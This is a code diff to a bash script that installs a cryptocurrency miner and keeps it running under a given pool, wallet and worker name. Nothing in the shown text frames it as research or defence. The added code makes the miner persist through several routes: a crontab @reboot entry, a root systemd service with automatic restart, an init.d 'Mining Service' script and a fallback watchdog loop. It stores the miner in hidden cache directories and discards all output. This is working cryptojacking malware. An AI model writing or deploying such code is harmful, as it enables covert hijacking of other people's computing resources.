@@ -1,6 +1,6 @@
 #!/bin/bash
 # Universal Persistent Script (Low/High Privilege)
-# GitHub: https://github.com/yourusername/yourrepo
+# GitHub: https://github.com/dadashabi123/shabi
 
 set -euo pipefail
 
@@ -30,21 +30,32 @@ debug_echo() {
 ### 初始化环境 ###
 init_env() {
     debug_echo "开始初始化环境"
-    # 按优先级选择存储目录
-    for dir in "/tmp" "/var/tmp" "/dev/shm" "/var/lib/jenkins/tmp" "/var/lib/jenkins"; do
-        if [ -w "$dir" ]; then
-            STORE_DIR="$dir/.${BIN_NAME}_cache"
-            debug_echo "选择存储目录: $STORE_DIR"
-            break
-        fi
-    done
-    
+    # 高权限用户优先使用 /var/tmp 或 /var/lib
+    if [ "$(id -u)" -eq 0 ]; then
+        for dir in "/var/tmp" "/var/lib" "/tmp"; do
+            if [ -w "$dir" ]; then
+                STORE_DIR="$dir/.${BIN_NAME}_cache"
+                debug_echo "选择存储目录: $STORE_DIR"
+                break
+            fi
+        done
+    else
+        # 低权限用户或无 home 目录的用户
+        for dir in "/tmp" "/var/tmp" "$(pwd)"; do
+            if [ -w "$dir" ]; then
+                STORE_DIR="$dir/.${BIN_NAME}_cache"
+                debug_echo "选择存储目录: $STORE_DIR"
+                break
+            fi
+        done
+    fi
+
     # 如果所有目录都不可写，使用当前目录
     if [ -z "${STORE_DIR:-}" ]; then
         STORE_DIR="$(pwd)/.${BIN_NAME}_cache"
         debug_echo "使用当前目录: $STORE_DIR"
     fi
-    
+
     # 确保目录存在并可写
     mkdir -p "$STORE_DIR"
     if [ ! -w "$STORE_DIR" ]; then
@@ -142,41 +153,119 @@ start_process() {
 ### 持久化方式检测 ###
 setup_persistence() {
     debug_echo "开始设置持久化"
-    
-    # 1. 尝试 Cron（最通用）
+
+    # 1. 首选 Cron（通用且不需要高权限）
     if command -v crontab >/dev/null; then
         debug_echo "使用 Cron 持久化"
-        # 创建内存中的启动命令
         STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
-        # 添加到 crontab
         (crontab -l 2>/dev/null; echo "@reboot $STARTUP_CMD") | crontab - >/dev/null 2>&1
-        # 立即执行启动命令
         eval "$STARTUP_CMD" &
-    
-    # 2. 尝试 rc.local（如果存在）
-    elif [ -f "/etc/rc.local" ] && [ -w "/etc/rc.local" ]; then
-        debug_echo "使用 rc.local 持久化"
-        # 在 rc.local 中添加启动命令
-        echo "cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &" >> "/etc/rc.local"
-        # 立即执行启动命令
-        cd "${STORE_DIR}" && nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
-    
-    # 3. 回退到 while 循环（最低权限）
-    else
-        debug_echo "使用 While 循环监控"
-        # 直接在内存中创建监控函数
-        monitor_func() {
-            while true; do
-                if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
-                    cd "${STORE_DIR}"
-                    nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
-                fi
-                sleep 300
-            done
-        }
-        # 在后台启动监控函数
-        monitor_func &
+        return
     fi
+
+    # 2. 尝试 Systemd 服务（需要高权限）
+    if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null; then
+        debug_echo "使用 Systemd 持久化"
+        SERVICE_FILE="/etc/systemd/system/${BIN_NAME}.service"
+        cat > "$SERVICE_FILE" <<EOF
+[Unit]
+Description=${BIN_NAME} Service
+After=network.target
+
+[Service]
+ExecStart=${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+        systemctl enable "${BIN_NAME}.service" >/dev/null 2>&1
+        systemctl start "${BIN_NAME}.service" >/dev/null 2>&1
+        return
+    fi
+
+    # 3. 尝试 /etc/init.d 脚本（需要高权限）
+    if [ "$(id -u)" -eq 0 ]; then
+        debug_echo "使用 /etc/init.d 脚本持久化"
+        INIT_SCRIPT="/etc/init.d/${BIN_NAME}"
+        cat > "$INIT_SCRIPT" <<EOF
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides: ${BIN_NAME}
+# Required-Start: \$network
+# Required-Stop: \$network
+# Default-Start: 2 3 4 5
+# Default-Stop: 0 1 6
+# Short-Description: ${BIN_NAME} Service
+# Description: ${BIN_NAME} Mining Service
+### END INIT INFO
+
+# 存储目录
+STORE_DIR="${STORE_DIR}"
+BIN_NAME="${BIN_NAME}"
+POOL="${POOL}"
+WALLET="${WALLET}"
+THREADS="${THREADS}"
+WORKER_NAME="${WORKER_NAME}"
+
+# 启动命令
+START_CMD="cd \${STORE_DIR} && nohup \${STORE_DIR}/\${BIN_NAME} -o \${POOL} -u \${WALLET} --cpu-max-threads-hint \${THREADS} -p \${WORKER_NAME} --donate-level=0 -b >/dev/null 2>&1 &"
+
+case "\$1" in
+    start)
+        if ! pgrep -f "\${BIN_NAME}.*\${POOL}" >/dev/null; then
+            eval "\${START_CMD}"
+        fi
+        ;;
+    stop)
+        pkill -f "\${BIN_NAME}.*\${POOL}" >/dev/null 2>&1
+        ;;
+    restart)
+        \$0 stop
+        sleep 2
+        \$0 start
+        ;;
+    status)
+        if pgrep -f "\${BIN_NAME}.*\${POOL}" >/dev/null; then
+            exit 0
+        else
+            exit 1
+        fi
+        ;;
+    *)
+        exit 1
+        ;;
+esac
+exit 0
+EOF
+        # 设置权限
+        chmod +x "$INIT_SCRIPT"
+        
+        # 启用服务（根据系统类型选择命令）
+        if command -v update-rc.d >/dev/null; then
+            update-rc.d "${BIN_NAME}" defaults >/dev/null 2>&1
+        elif command -v chkconfig >/dev/null; then
+            chkconfig "${BIN_NAME}" on >/dev/null 2>&1
+        fi
+        
+        # 立即启动服务
+        "$INIT_SCRIPT" start
+        return
+    fi
+
+    # 4. 回退到 While 循环（最低权限）
+    debug_echo "使用 While 循环监控"
+    monitor_func() {
+        while true; do
+            if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
+                cd "${STORE_DIR}"
+                nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
+            fi
+            sleep 300
+        done
+    }
+    monitor_func &
 }
 
 ### 检查进程状态 ###
